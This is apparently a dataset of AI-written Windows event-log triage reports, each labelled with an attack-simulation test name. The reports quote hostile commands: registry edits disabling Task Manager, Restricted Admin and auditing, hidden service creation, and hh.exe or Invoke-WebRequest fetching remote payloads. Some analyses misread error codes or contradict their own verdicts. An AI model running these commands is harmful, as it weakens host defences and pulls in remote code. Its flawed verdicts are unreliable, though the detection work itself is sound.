Given the log entries, the vast majority of activities appear benign or related to legitimate administrative updates and routine system operations. However, the registry change initiated through a command prompt deserves more attention because it could potentially be legitimate system tuning or an indication of unauthorized modifications, depending on the user's intent or subsequent activities related to the policy change.

### Resolution

- **Resolution**: **SUSPICIOUS**

### Guidance:

1. **Verify User Intent**: Review the user `SERVER002\admin_test` activity and verify if the registry modification was intentional or necessary for legitimate administrative purposes.
2. **Monitor Further Activities**: Continue to monitor logs for any further potentially harmful behavior related to command-line or registry modifications.
3. **Review Similar Entries**: Assess similar entries in historical logs to determine if this is part of a repeated legitimate pattern or an anomaly.
4. **Security Policies**: Ensure security policies and procedures for registry changes are clearly defined and all legitimate modifications are documented.

By executing these actions, risk associated with potential unauthorized configuration changes can be mitigated effectively."
Msiexec.exe - Execute the DllRegisterServer function of a DLL,"Upon analyzing the provided logs, I have made the following observations:

1. **Application Log:**
   - The entry from the Software Protection Platform (SPP) Service does not indicate any malicious activity. This service is responsible for license management. 

2. **Sysmon Logs:**
   - The logs record various processes executed on the system. Notably:
     - **MicrosoftEdgeUpdate.exe** and associated setup and installer processes: These entries suggest a normal update or installation process for Microsoft Edge, executed by the NT AUTHORITY\SYSTEM. There is no indication of malicious behavior tied to these processes as they originate from trusted Microsoft paths and use commands likely associated with updating activities.
     - **wevtutil.exe**: This utility is used for managing Windows event logs. Multiple entries show it being executed by the user SERVER002\admin_test. While the execution of wevtutil can be used for log tampering, further context would be needed to assess its intent.
     - **cmd.exe** executing **msiexec.exe** with a DLL: This combination can be suspicious and possibly indicative of code execution or exploitation through side-loading techniques. The use of msiexec to execute a DLL can be a vector for malicious payload delivery.

3. **General Observations:**
   - **Frequent execution of system utilities** (e.g., conhost.exe alongside others like whoami.exe and cmd.exe) within short periods raises concerns. Repeated actions of these utilities could be indicative of automated scripts or administrator activities, especially under the user admin_test.
   - The logs do not record any direct indicators of privilege escalation attempts or exploit activities. However, the use of msiexec.exe for DLL execution in a user’s Temp directory is a known technique for executing arbitrary payloads, often seen in malicious activities.

In summary, the behavior of executing msiexec.exe and cmd.exe in a way that loads a DLL from a temporary directory is the most notable suspicious activity. Although there are legitimate uses for these actions, they are commonly associated with lateral movement or initial stages of an attack.

**Resolution: SUSPICIOUS**

**Guidance:**
- Further investigation is necessary to contextualize the use of wevtutil.exe and the cmd.exe/msiexec.exe commands. 
- Examine the associated DLL file at the specified path to determine if its conduct is legitimate or crafted for malicious purposes.
- Review the user SERVER002\admin_test's activities and authenticate any recent login patterns that appear unusual.
- Ensure all security updates are applied, particularly for software commonly exploited through DLL-side loading vulnerabilities."
Create and Hide a Service with sc.exe,"### Analysis of Logs

**Suspicious or Anomalous Behavior:**

1. **Discrepancies in System Time:**
   - Security log entries with Event ID 4616 show multiple instances where the system time was changed. For instance, the ""PreviousTime"" and ""NewTime"" properties indicate a reversion in time. Altering the system time can be indicative of malicious activity, such as attempting to avoid logging mechanisms or audit trails.

2. **Privilege Escalation:**
   - Event ID 4672 in the security log shows the user ""admin_test"" received special privileges, including SeDebugPrivilege, which is often exploited by malicious users to manipulate system processes.

3. **Abnormal Process Creation:**
   - The System log shows a new service ""fileService"" created with `C:\Windows\System32\calc.exe` as its image path. Creating a service with `calc.exe` could indicate an attempt to run a seemingly benign executable such as Calculator for nefarious purposes, possibly leveraging it as a persistence mechanism.

4. **Suspicious Process Execution:**
   - Sysmon logs show multiple instances of `cmd.exe` being executed with a command that involves creating and setting service permissions for ""fileService"". Using `sc.exe` to set permissions directly involves fairly advanced usage, suggesting a non-standard, potentially malicious configuration:
     ```plaintext
     CommandLine: ""cmd.exe"" /c sc.exe create fileService binPath= ""C:\Windows\System32\calc.exe""
     ```

5. **Process Execution Context:**
   - The user ""SERVER002\\admin_test"" appears to execute potentially orchestrated commands to manipulate services and permissions, which is unusual for a legitimate administrative action.

6. **Execution of Administrative Tasks through Tools:**
   - The `wevtutil` and `conhost.exe` processes are seen multiple times in the Sysmon log under the same user, ""admin_test"". While these processes can be legitimate, their repeated invocation by the same user in a short span raises suspicion of them being used for event log clearing or tampering.

**Assessment of Potentially Malicious Activity:**

- The presence of these activities—system time manipulation, privilege escalation, creation, and permission setting of unconventional services, and multiple invocations of command-line tools all under a seemingly newly added or test administrator account—points towards indicators of possible exploitation or setup for a persistent attack.

### Threats or Risks Identified
- Privilege escalation and unauthorized changes to system security settings increase the risk of system compromise.
- The creation and manipulation of services using odd executable paths can be a precursor to establishing persistence for malware.

### Guidance on How to Proceed:
1. **Immediate Remediation:**
   - Temporarily disable the ""fileService"" and inspect its creation context.
   - Reset system time to correct values.
   - Audit the ""admin_test"" account for any unauthorized privilege assignments; consider disabling this account pending further inquiry.

2. **Further Investigation:**
   - Correlate with network logs to see if any external connections were made during these events.
   - Perform a thorough forensic analysis on the host to identify the root cause of unauthorized actions.

3. **Recommendation for System Hardening:**
   - Implement stricter auditing policies for time changes, privilege escalations, and service modifications.
   - Ensure that all administrator actions are logged and reviewed periodically.

**Resolution: MALICIOUS**
- The activities identified bear strong indicators of malevolent intent, particularly aimed at persistence and potential system compromise. Further action is needed to prevent possible exploitation or data breach."
Enabling Restricted Admin Mode via Command_Prompt,"After analyzing the provided Windows event logs, we explore both the Security and Sysmon logs for indications of any potential malicious activity:

### Analysis:

1. **Security Log:**
   - **Event ID 4616:** The security log entries with Event ID 4616 indicate a system time change by the `svchost.exe` process. This process changing the system time is generally unusual and could be indicative of a tactic used by malware to manipulate time-dependent tasks or logs.

2. **Sysmon Log:**
   - **Execution of wevtutil.exe and conhost.exe by admin_test:** Multiple instances of `wevtutil.exe` and `conhost.exe` being launched close together can be perceived as unusual. `wevtutil.exe` is primarily used for managing event logs which could mean log manipulation. Interestingly, all usage is by `SERVER002\admin_test`, displaying activity convergence in a short time span.
   - **Execution of cmd.exe with Registry Modification:**
     - **Command:** `""cmd.exe"" /c reg add ""hklm\system\currentcontrolset\control\lsa"" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0`
     - The event log entry indicates that the Windows registry was modified to `DisableRestrictedAdmin`. Changes to the registry, particularly those related to authentication protocols and security settings, are often intended to weaken security and could lead to unauthorized remote access scenarios. This command execution is highly suspicious and points towards potential malicious activity.

3. **Context & Patterns:**
   - **Time Synchronized Activities:** The series of operations occur almost instantaneously, suggesting potential automation or scripting activity.
   - **Admin Activity:** Most activities were under the `SERVER002\admin_test` user, but authenticity or compromise of the user account itself should be considered, given the types of activities observed, such as registry modification.

4. **Other Logs:**
   - **Application Log:** Contains regular entries related to service operations without flags tied to suspicious actions.
   - **System Log:** Shows synchronization events and time adjustments without any explicit harmful data points.

### Assessment:
Given the evidence of registry modifications tied to authentication, usage of commands likely meant for obfuscation (time change), and potential tampering with logs:

- **Resolution: MALICIOUS** - Based on the execution of registry modification commands intended to alter authentication protocols significantly and abnormal time adjustment activities, the actions are consistent with behavior seen in compromised host scenarios.

### Guidance:
- **Immediate Actions:**
  - Investigate the source of the registry modifications and confirm if this was done legitimately.
  - Review user account activities for `SERVER002\admin_test` for unauthorized access or anomalies.
  - Validate the need for time change activity on the server.
  - Conduct comprehensive threat hunting across affected nodes for similar indicators or active threats.

- **Recommendations:**
  - Implement and enforce stricter access controls for registry modifications.
  - Set up more rigorous monitoring and alerting for time change events, particularly by non-administrative processes.
  - Strengthen endpoint security with behavior-based detection to flag potential lateral movement within the network.
"
Compiled HTML Help Remote Payload,"Upon a thorough analysis of the provided Windows event logs from the host identified as ""Server002,"" certain activities stand out that could be indicative of suspicious or potentially malicious behavior:

1. **Unusual Time Changes:**
   - Logs show Event ID 4616, which indicates a system time change. The time was reset from ""2024-10-25 22:12:23.4163935"" back to ""2024-10-25 22:12:17.8623351."" Frequent or unauthorized changes to system time could be used to hinder forensic investigations or change the timestamp of events.

2. **Privileged Access Use:**
   - Numerous instances of Event ID 4672 show that the user ""admin_test"" had clearly elevated privileges, including SeDebugPrivilege and SeTakeOwnershipPrivilege. While this might be expected for administrative tasks, excessive or unnecessary use of these privileges can pose a threat, especially if they are being utilized in conjunction with other suspicious activity.

3. **Network Connections and NTLM Logins:**
   - Event ID 4624 shows multiple NTLM logins by ""admin_test"" from both IPv4 and IPv6 addresses (""192.168.0.102"" and ""fe80::e3b5:5371:12a8:9c77""). If these IPs don’t correlate with trusted devices or expected user behavior, they may suggest lateral movement or unauthorized access.

4. **Execution of potentially suspicious commands:**
   - In Sysmon logs, the execution of `cmd.exe` with the command line involving `hh.exe` to access an online location (https://raw.githubusercontent.com/file/file-file/master/files/data.001/src/data.001.chm) can be suspicious. `hh.exe` is the HTML Help executable and can be used for malicious purposes such as script execution.

5. **Use of PowerShell with Restricted Policy:**
   - Powershell logs show execution with `Restricted` policy, which typically doesn’t allow script execution unless a policy bypass or similar method has been exploited.

6. **Presence of Potential Indicators of Compromise:**
   - The execution of `wevtutil.exe` and `conhost.exe` multiple times could be benign, but combined with other factors such as time changes, it could indicate attempts to clear logs or perform other nefarious tasks.

Based on these observations:
- **Resolution: SUSPICIOUS**

While none of the detected activities provide conclusive evidence of a breach or malicious attack, the combination of privilege escalation, system time alteration, and potentially unauthorized command-line usage warrants further investigation. It would be prudent to verify system time changes, inspect the intent behind the Powershell commands, ascertain the legitimacy of incoming IP addresses, and validate whether executed processes and URLs accessed align with expected behaviors."
Rundll32 with Control_RunDLL,"In analyzing the Windows event logs provided, several noteworthy patterns and activities can be observed:

### Suspicious Findings:

1. **Unexpected PowerShell Activity**:
   - The first Sysmon log entry shows the execution of `powershell.exe` by the user `SERVER002\\admin_test`. PowerShell is often used in legitimate IT operations but can also be employed by threat actors to perform malicious activities due to its powerful capabilities.

2. **Execution of Rundll32 with Non-standard DLL**:
   - There is a command execution via `cmd.exe` utilizing `rundll32.exe` to run a DLL located in a temporary directory: 
     ```
     CommandLine: ""cmd.exe"" /c rundll32.exe shell32.dll,Control_RunDLL ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\calc.dll""
     ```
   - The use of `rundll32.exe` to execute a DLL from a temporary directory is a common tactic used by malware for persistence or execution. The `taskhostw.exe` process launching `rundll32.exe` adds more suspicion due to the potential for script execution.

### Benign Findings:

1. **Regular System and Microsoft Edge Update Processes**:
   - Several entries are related to `MicrosoftEdgeUpdate.exe`, which is part of the legitimate update process for Microsoft Edge. 
   - The activity includes updates and registration operations, which appear to be consistent with legitimate update processes from Microsoft.

### Further Analysis Recommendations:
- **Analyze DLL Executed by Rundll32**: Further investigation into the DLL (`calc.dll`) is needed. This would include file hash checks against known malicious databases, static analysis, and dynamic execution in a controlled environment.
  
- **Review PowerShell Execution History and Scripts**: Analyze the script or commands executed via PowerShell to ascertain intent and actions performed.

- **Monitor Temporary Folders**: Closely monitor the temporary folders for any changes or addition of unexpected files, especially DLLs.

### Final Resolution:
- **SUSPICIOUS**: The observed use of `rundll32.exe` with a DLL in a temp directory, and PowerShell execution warrants further investigation. While not 100% confirmed to be malicious, these activities are indicators that could suggest malicious intent and should be analyzed in more detail to rule out any threats."
Modify Internet Zone Protocol Defaults in Current User Registry - PowerShell,"**Analysis of the Windows Event Logs:**

1. **Application Log:**
   - The application log mentions the `edgeupdate` service being stopped. This by itself, without additional context, does not immediately indicate malicious activity. Edge updates could have been scheduled, or the service could have been stopped due to system maintenance activities.

2. **System Log:**
   - There are events related to time adjustments made by the system, typically seen with NTP when synchronizing time with `time.windows.com`. Such operations are routine and necessary for maintaining accurate system time and are not inherently suspicious.
   - These time change events have been executed by `svchost.exe`, a legitimate process often used by Windows services.
   - The logs indicate standard kernel actions and time service operations, which are typically benign unless there is evidence of tampering, which there isn't in this case.

3. **Windows PowerShell Log:**
   - The log entries indicate the execution of a PowerShell script that alters registry settings related to internet zone mapping, specifically setting `http` and `https` protocols to zero. This behavior is indicative of a potential attempt to manipulate security zones, which could be used to bypass certain security controls or alter how the system interacts with the internet.
   - PowerShell being used to manipulate registry settings in this manner can often be a red flag for malicious scripts or administrative changes performed outside of standard procedures.

4. **Sysmon Log:**
   - Sysmon logs detail various system operations, including the execution of system processes such as `whoami.exe` and several executions related to `EdgeUpdate`.
   - There are repeated uses of legitimate Windows utilities such as `hostname.exe` and `whoami.exe`, and the use of `PowerShell` by the user `admin_test`. While these entries can be part of legitimate administration, they can also be used by attackers post-compromise for reconnaissance and maintaining persistence.
   - The recurrent appearance of `PowerShell` and the subsequent registry changes highlight potential suspicious activities.

5. **Security Log:**
   - The security log features `EventID 4616`, which shows system time changes performed by processes running under the `LOCAL SERVICE` account. These appear to correlate with the time service adjustments mentioned in the system log, aligning with regular time synchronization activities.

**Assessment:**

The logs present several elements worth investigating further. The notable points are:
- PowerShell script execution that modifies registry settings associated with internet protocols.
- Elevated permissions usage by PowerShell and the alteration of system settings, which can be suggestive of policy bypass attempts or unauthorized configurations.

No conclusive evidence of malware execution or system compromise is directly apparent in the logs. However, the behavior exhibited by the PowerShell script adjusting registry settings without sufficient context (such as change initiated by IT personnel or automated patch management) raises concerns.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Conduct a thorough review of recent changes executed on the host, particularly those involving PowerShell usage and registry changes.
- Examine the context of the `edgeupdate` service stoppage, ensuring it aligns with normal operating procedures or scheduled updates.
- Investigate the user account `admin_test` for any unusual activities or potential unauthorized access.
- Monitor the host for any further unusual activities, focusing on unusual command-line executions or privilege-escalation attempts via PowerShell.
- Implement stricter monitoring and logging for PowerShell and ensure appropriate policies are in place to alert on potentially malicious use.

Consider performing a vulnerability assessment or a penetration test to ensure there are no underlying weaknesses that could be exploited in similar environments."
Disable Windows Lock Workstation Feature,"Based on the analysis of the provided Windows event logs from the Sysmon and Application logs, here's the detailed assessment:

### Observations:

1. **Frequent Execution of Wevtutil and Conhost:**
   - Multiple processes for `wevtutil.exe` and `conhost.exe` are being executed repeatedly within milliseconds of one another by the user `SERVER002\admin_test`. 
   - `wevtutil.exe` is typically used for managing Windows Event logs which can potentially indicate malicious activity if not expected or verified, especially if running in unusual volumes or contexts.

2. **Command-Line Activity:**
   - **CMD and REG Executions:** 
     - A `cmd.exe` process initiated by `SERVER002\admin_test` with the command line adding a registry key to disable lock workstation: 
       - `CommandLine: ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableLockWorkstation /t REG_DWORD /d 1 /f`
     - This modification of registry settings can potentially be an attempt to prevent the screen from locking, which is suspicious because it suggests a desire to maintain access without interruption.

3. **Execution of Hostname and Whoami:**
   - The execution of `HOSTNAME.EXE` and `whoami.exe` by `SERVER002\admin_test` is noted. While these utilities in isolation are benign, they can be used in a sequence with other tools for reconnaissance and script activities.

4. **Microsoft Edge Update Activity:**
   - Multiple executions of `MicrosoftEdgeUpdate.exe` and related processes by `NT AUTHORITY\SYSTEM`. This could be attributed to legitimate update activities, but the presence of temporary directories and repetitive configurations suggest this needs verification.

5. **General Evaluation of Process Execution:**
   - The logs exhibit a burst of rapid process creations and terminations across different system utilities and update services, which suggests automated or scripted activity patterns.

### Risks & Suspicion:

- The registry modification to disable workstation lock and the number of times event logs tools were launched is indicative of suspicious activity. It suggests a potential attempt to conceal activities or escalate privileges without disturbing ongoing user sessions.
- The Sysmon logs don't provide details on network connections, file creations, or other typical malicious actions, leaving room for doubt without a clear line of malicious behavior.

### Resolution:

- **SUSPICIOUS:** 
  - The sequence and nature of events, especially registry modifications and repeated use of event utilities under an admin profile, raise suspicion. However, without direct malicious actions like known malware execution or confirmed privilege escalations, it requires further investigation.
  
### Recommendations:

1. **Further Investigation:**
   - Check context and legitimacy of the `wevtutil.exe` usage. Confirm with the relevant administrative actions or necessary audits that were recently run.
   - Investigate registry changes and check for any unauthorized access or scripts that might have caused these actions.

2. **User Verification:**
   - Confirm whether account `SERVER002\admin_test` activity aligns with expected administrative tasks.
   
3. **Monitoring and Alerts:**
   - Implement monitoring for any unusual command-line executions and registry changes focusing on disabling security features or audit logs.

4. **Approval of Updates:**
   - Verify and validate Edge update activities, ensuring they are stemming from trusted sources."
Regasm Uninstall Method Call Test,"Upon reviewing the provided Windows event logs, here's a detailed analysis of any potential indicators of malicious activities:

### Application Logs:
1. **Software Protection Platform Service Event (Event ID: 16384)**:
   - This event relates to software protection platform activities, and no suspicious actions are identified from this log entry.
   
2. **EdgeUpdate Service Event**:
   - Two consecutive entries indicating that the service has stopped. While it is slightly unusual to have consecutive ""service stopped"" logs, they can occur due to regular service management or updates. Without additional context, this doesn't immediately indicate malicious activity.

### Sysmon Logs:
1. **MicrosoftEdgeUpdate.exe Execution**:
   - Various instances of `MicrosoftEdgeUpdate.exe` are reported executing different command-line parameters. This is consistent with regular update activities for the Microsoft Edge browser.
   - Parameters like `/svc`, `/c`, `/ua /installsource core`, etc., are typical for updating services and do not inherently indicate malicious actions.

2. **Powershell and Command Shell Activities**:
   - The log shows a PowerShell execution by `SERVER002\admin_test`. Without information on the commands executed, this alone isn't inherently suspicious.
   - Multiple `cmd.exe` executions appear to compile and register .NET assemblies (`csc.exe`, `regasm.exe`). This behavior often aligns with software installations or maintenance scripts. However, if this is unexpected activity on the host, it might warrant a closer look for any unauthorized actions.
   
3. **Processes Wevtutil and Conhost Activities**:
   - `Wevtutil.exe` and `conhost.exe` processes executed by `SERVER002\admin_test` suggest possible interaction with event logs or the command shell. While these utilities can be part of normal administration, unplanned execution should be verified.

4. **Host and Identity Check Commands**:
   - Execution of `hostname.exe` and `whoami.exe` suggests attempts to identify the system and user context. This could be part of standard checks or preliminary actions from a script/kick-off task.

5. **Miscellaneous File Execution**:
   - Activity related to file compiling and registration (`csc.exe` and `regasm.exe`) in the temporary directory can be typical of some development processes or application setups.

### Assessment and Resolution:
Overall, while there are multiple instances of process execution and service activity logs, nothing directly indicates malicious behavior. The `MicrosoftEdgeUpdate.exe` activities align with standard updates. The PowerShell log is empty, offering no insight into potentially suspicious commands that might have been run. 

The suspicious part involves the repetitive execution of compilers and registry actions with cmd.exe and conhost.exe. However, without a specific indicator of malicious intent or exploitation (like known malicious hashes, suspicious command lines, or execution sourced from outside typical directories), these could still fall within automated system maintenance or legitimate administrative tasks.

Given the current information and without further suspicious entries like unauthorized external network activity or file changes associated with known malware, **the activity described in the logs seems to fit within expected boundaries**. However, the period of intense system activity could indicate the need for contextual verification for unusual user behavior.

**Resolution: SUSPICIOUS**
- Recommend performing additional checks to verify the legitimate purpose of admin activity, and validate whether this activity corresponds with any automated updates or administrative scripts.
- Monitor for further activities or new context changes that might elevate this to a threat."
Disable Windows Task Manager application,"**Analysis of Windows Event Logs**

### Key Observations:

1. **Time Adjustment Events:**
   - There are multiple `Windows-Kernel-General` and `Security-Auditing` events showing that the system's time was set backward from `14:53:08.799` to `14:53:06.816`. Time adjustments can be legitimate system behavior but can also be used by attackers to hide tracks or manipulate logs.

2. **Edge Update Events in Application Log:**
   - Multiple instances of `MicrosoftEdgeUpdate` stopping and starting, which is typical for scheduled updates.

3. **Powershell Logs:**
   - No entries available for investigation.

4. **Security Events:**
   - `Event ID 4616`: This indicates a time change event by `svchost.exe`.

5. **Sysmon Logs:**
   - There are numerous process creation logs involving `MicrosoftEdgeUpdate.exe`, `whoami.exe`, `cmd.exe`, `reg.exe`, and `conhost.exe`.
   - **Highlight**: A particular Sysmon event where `cmd.exe` executed a command to modify registry settings to disable Task Manager:
     ```
     cmd.exe /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableTaskmgr /t REG_DWORD /d 1 /f
     ```

6. **Registry Modification:**
   - The creation of the registry key to disable Task Manager by the process `cmd.exe` with high integrity level is highly suspicious. This action is commonly associated with malware attempting to prevent a user from terminating malicious processes.

### Assessment:

- The time change behaviors, although potentially legitimate depending on system settings and configurations, are often inspected in security investigations for potential log manipulation.
- The multiple executions of `MicrosoftEdgeUpdate.exe` processes match Edge's regular update patterns typically triggered automatically by the system; however, without further anomalies, they aren't deemed malicious by themselves.
- The execution of a command to disable Task Manager indicates a likely malicious activity.

### Conclusion:

- **Resolution: MALICIOUS**

The log entry showing the execution of a command to disable the Task Manager is indicative of malicious behavior unless founded on a recognized administrative action. It's recommended to:
- Isolate the system for further inspection.
- Investigate any scripts or policies applied recently that may involve registry changes.
- Conduct a thorough malware scan.
- Review administrative actions around the time of these events.
- Look for any additional signs of compromise or unauthorized access.

### Guidance:

- Proceed with further investigations into the registry changes and verify if there were any scheduled tasks or legitimate processes explaining the behavior.
- Depending on the findings, consider restoring the system to a previously known safe state and changing passwords if credential compromise is suspected."
Do Not Connect To Win Update,"Upon reviewing the provided Windows event logs, I have noted the following key observations:

1. **Time Synchronization:**
   - System logs indicate time synchronization events at 17:23:41, with `svchost.exe` as the responsible process. The time adjustments appear normal as they coincide with common time update operations.
   - Security logs confirm these time adjustments were carried out by `svchost.exe` under the `LOCAL SERVICE` account, which are typical for legitimate time synchronization activities.

2. **Process Execution:**
   - The Sysmon logs document several process creations, primarily involving standard Windows utilities (`whoami.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, `cmd.exe`, `reg.exe`, and `svchost.exe`). The execution of these processes is tracked under the `SERVER002\admin_test` user account, which indicates an administrative user is operating these commands.
   - Execution of utilities like `whoami.exe`, `hostname.exe`, and `wevtutil.exe` do not inherently indicate malicious activity; they are often used for system administration and information gathering.
   - A notable command executed is `cmd.exe` with parameters to modify Windows Update registry settings, potentially to disable connection to Windows Update Internet locations. This could be part of legitimate system configuration management but could also indicate an attempt to control or limit system updates.

3. **Registry Modification:**
   - A registry change command (`reg add`) was observed, executed via `cmd.exe`, aimed at altering Windows Update settings. This action could be legitimate if performed by administrators for policy enforcement but could also represent a security risk if unauthorized.

4. **Software Protection Service:**
   - The application log entry from the Software Protection Platform Service at 17:24:01 appears routine, confirming that the service is functioning to enforce software licensing.

**Assessment:**
- **BENIGN:** The System and Security logs suggest routine system operations, particularly time synchronization.
- **POTENTIALLY SUSPICIOUS:** Sysmon logs include registry modification related to Windows Updates, which could be harmless administrative activity but also potentially malicious if unauthorized and aiming to impair system update processes.

**Conclusion:**
Given the data provided, the overall activity appears **SUSPICIOUS** because of the registry modification activity that should be investigated further. This specific action could indicate a system policy change that requires authorization verification. It is recommended to:
- Review change management records to ensure this was an authorized configuration change.
- Verify with the user `SERVER002\admin_test` or relevant personnel if the registry modification aligns with documented administrative procedures.
- Monitor further activities on the system for additional indicators of compromise."
File Extension Masquerading,"After a detailed analysis of the provided Windows event logs, the following observations and assessments are noted:

1. **Windows PowerShell Usage:**
   - Multiple instances of PowerShell are executed with commands targeting files with suspicious extensions such as `.doc.ps1`, `.pdf.ps1`, and `.rtf.ps1` in a temporary directory. This indicates the files are scripts disguised as documents, which is a known technique used in malicious activities to evade detection.
   - The script files are executed from a temporary directory, which is a common tactic used by attackers to leverage script-based attacks with minimal traces.

2. **Security Log Entries (Event ID 5379):**
   - Repeated log entries with Event ID 5379 indicate unsuccessful credential reading attempts. The ReturnCode 3221226021 signifies an error (STATUS_LOGON_FAILURE), suggesting potential unauthorized access attempts.

3. **Sysmon Entries:**
   - There are numerous process creation and file creation operations related to command-line executions with cmd.exe, utilizing command-line parameters to manipulate files in temporary directories. The command execution includes 
   ```
   copy operations using ""calc.exe""
   ```
   resulting in files with altered extensions, further hinting at masquerading or potential injection attempts.

4. **Privilege Escalation:**
   - A log entry with Event ID 4672 shows that privileges were assigned, including SeDebugPrivilege, which is typically suspicious unless justified by administrative tasks. Granted privileges in the SYSTEM context should be closely monitored to ensure no privilege escalation attempts were conducted illegitimately.

5. **Windows Update and System Processes:**
   - The logs indicate normal operations for Windows Update and its services, such as wuauclt.exe, AM_Delta.exe, and MicrosoftEdgeUpdate.exe. These processes and accompanying events appear regular and aligned with system maintenance operations.

**Conclusion:**
The event logs contain clear indicators of potentially malicious activity, primarily involving the use of PowerShell scripts masquerading as benign document files, and unauthorized credential access attempts which can suggest an ongoing attack or exploitation scenario.

**Resolution: MALICIOUS**
The combination of suspicious PowerShell executions, file manipulations, and unauthorized credential attempts indicates high confidence in malicious activity being present in the logs. Immediate action is required to isolate affected systems, initiate a more comprehensive investigation, and implement security measures to prevent further exploitation."
Register Portable Virtualbox,"Upon analyzing the provided event logs, the following points stand out:

1. **PowerShell Execution**: 
   - The Sysmon log entries show numerous instances of PowerShell execution by the user `SERVER002\admin_test`. There is a specific PowerShell log entry indicating a script execution involving `Invoke-WebRequest` to download a file from GitHub: `https://github.com/file/file-file/raw/master/files/data.006/bin/common.cab`. This command is suspicious as it involves the downloading of a potentially arbitrary file from the internet, which could be a sign of malicious activity, such as an attempt to download and execute malicious software.

2. **Service Creation and Execution**:
   - The Sysmon log entries describe a sequence where `cmd.exe` is used to execute various commands, including `sc create VBoxDRV` and `sc start VBoxDRV`. While the action took place in the context of Oracle VirtualBox utilities, the command sequence still suggests that a potentially unauthorized service could be being set up and run on the system, which warrants further inspection.

3. **Unusual Activities in Temporary Directory**:
   - The mentioned activities such as the download and modification operations using PowerShell and command executions are executed from a users' Temp directory, `C:\Users\ADMIN_~1\AppData\Local\Temp\`, which is an unusual place for such legitimate scripts to execute, adding a layer of suspicion.

4. **Installation Attempts**:
   - The PowerShell command logs and sequence of executing `msiexec.exe` with specific embedding commands could suggest an unauthorized installation attempt which may or may not be permitted under company policy, further investigation is advised.

5. **Usage of Privileged Accounts**:
   - The logs show the execution of sensitive commands under a high integrity level and often under the `SERVER002\admin_test` account, which requires an assessment of whether these actions were expected and approved.

6. **Log Clarity**:
   - There are multiple operations lacking a clear legitimate business purpose, executed rapidly in succession without human user interjection, a typical sign of automation potentially associated with malicious scripts.

Given the combination of these activities, especially the download of a file using PowerShell from an external source, coupled with service manipulation using the command line, the logs suggest there are elements indicative of potentially unauthorized or malicious activity.

**Resolution**: **SUSPICIOUS** - The activities, while not conclusively malicious, are sufficiently suspicious to warrant further investigation, including verifying the legitimacy of these operations, understanding their context, the purpose of the downloaded files, and confirming the administrator's awareness and approval of these actions. Follow-up actions should include checking for known indicators of compromise, applying forensic analysis on the downloaded file, and monitoring similar future activities."
Impair Windows Audit Log Policy,"Upon reviewing the provided Windows event logs, several points of interest stand out that could indicate suspicious or malicious activity:

1. **Audit Policy Modifications:**
   - Multiple instances (Event ID 4719) show that the audit policy on the system was altered by the user `admin_test`. Specifically, audit settings for ""Account Logon"", ""Logon/Logoff"", and ""Detailed Tracking"" were disabled. Disabling audit logs can be indicative of an attempt to conceal malicious activity as it can prevent recording of actions that would typically raise alerts.

2. **Execution of CMD and Auditpol:**
   - There are events (Sysmon Event ID 1) showing `cmd.exe` being executed with command line arguments to disable various audit policies using `auditpol`. This command line is consistent with malicious activities where an attacker attempts to cover tracks by disabling auditing features on the target system.

3. **Frequent Execution of Wevtutil, Conhost, and other System Utilities:**
   - Repeated execution of `wevtutil.exe` and `conhost.exe` under the user `admin_test` within a very short timeframe might suggest automation or scripting activities typical in lateral movement or tedious tasks associated with larger operations.

4. **High Integrity Level Execution:**
   - Processes such as `whoami.exe`, `cmd.exe`, and `wevtutil.exe` were executed with high integrity levels under `admin_test` user account, which could indicate potential privilege execution if these processes were not part of standard use.

5. **Consistent Activity from `admin_test`:**
   - The `admin_test` user is consistently seen executing various system utilities. While not inherently malicious if `admin_test` is a known and trusted user, the combination of the activities conducted under this user’s context raises concerns about unauthorized actions or potential compromise of this account.

6. **Time Synchronization Event:**
   - The system time was altered (Event ID 4616), suggesting someone might have adjusted the time, possibly in an attempt to synchronize activities with an outside timeline or to manipulate the timing of file entries/logger records as part of evasion tactics.

Based on the analysis of these points:

- **Resolution: MALICIOUS**

The events logged demonstrate behaviors commonly associated with malicious activity, particularly the disabling of audit logs and suspicious command execution patterns that suggest tampering intended to hide additional unauthorized activity. Immediate steps should involve:
- Checking the account status and activities of `admin_test` to determine legitimacy.
- Conducting a detailed forensic analysis of the system to identify any additional indicators of compromise.
- Restoring audit policies and reviewing audit logs for any other unusual activities.
- Doubling down on monitoring for any further unauthorized attempts or activities."
Delete an entire folder - Windows cmd,"Upon reviewing the provided Sysmon logs, the following observations and analysis can be made:

### Analysis of Logs:

1. **Whoami and Hostname Execution:**
   - Instances of `whoami.exe` and `hostname.exe` being executed are observed. These are legitimate Windows utilities typically used to gather system and user information. 
   - The `whoami.exe` tool displays the logged-on user information. Four such instances were recorded, and their execution does not inherently indicate malicious activity.
   - The `hostname.exe` tool, which provides the network name of the computer, was executed once. Similar to `whoami.exe`, its execution alone is not suspicious but can be used by attackers for reconnaissance.

2. **Command Prompt (cmd.exe) Execution:**
   - Multiple instances of `cmd.exe` were executed, performing tasks that manipulate temporary directories with the `mkdir`, `IF EXIST` conditions, and cleanup using `rmdir`.
   - Such command-line activities could be associated with scripted automation or cleanup tasks. However, without additional context or a concurrent suspicious activity, these actions do not definitively indicate malicious intentions.

3. **Conhost Execution:**
   - The `conhost.exe` process supports command prompt operations. Its frequent appearance is typical when command-line commands are executed.

4. **Wsmprovhost and Embedded Process:**
   - The consistent presence of `wsmprovhost.exe` as a parent process might indicate these actions are spawned from legitimate administrative operations, possibly remote management tasks or scripts executed under administrative privileges.

5. **Wevtutil Execution:**
   - The `wevtutil.exe` tool is used to manage event logs. While it's legitimate for log reading, clearing, or exporting, its repeated and clustered execution might suggest a cleanup attempt post-activity, a known tactic to thwart detection.

6. **Integrity Levels and Logged-on User:**
   - All processes were executed under the `SERVER002\admin_test` user context with a high integrity level, suggesting they have elevated privileges. This is typical in environments requiring admin-level scripts but can present potential risks if compromised.

7. **Service and Background Activities:**
   - Standard services such as `sppsvc.exe`, `svchost.exe`, and `TiWorker.exe` were running, indicating regular background operations. 

### Conclusion:

Based on the analysis of the logs:

- The execution patterns seen could be consistent with automated tasks, scripts, or administrative maintenance routines commonly found within a heavily managed server environment.
